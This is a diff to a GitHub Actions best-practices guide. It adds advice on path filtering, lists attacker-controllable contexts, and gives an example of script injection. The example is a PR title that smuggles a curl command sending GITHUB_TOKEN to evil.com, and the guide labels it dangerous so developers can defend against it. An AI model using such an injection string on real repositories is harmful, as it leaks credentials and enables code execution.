@@ -66,7 +66,7 @@ Before writing any workflow, look up the current latest major version for each a
 - **With `gh` CLI:** `gh api repos/<owner>/<repo>/releases/latest --jq .tag_name`
 - **Without either:** use the most recent major version you know confidently — do NOT guess minor/patch numbers. If uncertain, note it explicitly so the user can verify.
 
-Dependabot (see below) will keep these tags current automatically.
+Dependabot (see below) will keep these tags current automatically, ensuring you receive security patches within the major version without any manual effort.
 
 ### 3. Concurrency Groups
 
@@ -112,6 +112,36 @@ Re-downloading all dependencies on every run is the single largest source of avo
 ```
 
 For ecosystems without built-in cache support, use `actions/cache` with a meaningful key.
+
+---
+
+## Supplementary Best Practices
+
+### Path Filtering
+
+Avoid triggering workflows when irrelevant files change. This is the simplest way to reduce wasted CI minutes.
+
+```yaml
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'src/**'
+      - 'package*.json'
+    paths-ignore:
+      - '**.md'
+      - 'docs/**'
+  pull_request:
+    branches: [main]
+    paths:
+      - 'src/**'
+      - 'package*.json'
+    paths-ignore:
+      - '**.md'
+      - 'docs/**'
+```
+
+**Note:** If `paths` and `paths-ignore` both match the same file, `paths-ignore` wins. For documentation-only repos, omit path filtering entirely.
 
 ---
 
@@ -346,4 +376,23 @@ Adapt Pattern A's Node.js CI to other ecosystems:
 
 **Separate `actions/cache` step when the setup action has a `cache:` parameter** — Redundant and error-prone. Use the built-in parameter where available.
 
-**`run: echo "${{ github.event.pull_request.title }}"`** — Direct interpolation of untrusted input in `run:` blocks enables script injection. Always pass untrusted values through environment variables instead.
+**Script injection via direct `${{ }}` interpolation in `run:` blocks** — User-controlled values injected directly into shell commands allow an attacker to execute arbitrary code. Always pass untrusted input through environment variables.
+
+Contexts that are attacker-controllable and must never be interpolated directly into `run:`:
+- `github.event.issue.title` / `.body`
+- `github.event.pull_request.title` / `.body`
+- `github.event.comment.body`
+- `github.event.review.body`
+- `github.head_ref` (PR branch name — can be set by the PR author)
+
+```yaml
+# DANGEROUS — attacker can set PR title to: "; curl https://evil.com?t=$GITHUB_TOKEN; echo "
+- run: echo "PR title: ${{ github.event.pull_request.title }}"
+
+# SAFE — shell treats the variable as data, not code
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR title: $PR_TITLE"
+```
+
+For deployment workflows using cloud credentials, see `references/security-practices.md` for OIDC setup (preferred over long-lived secrets).
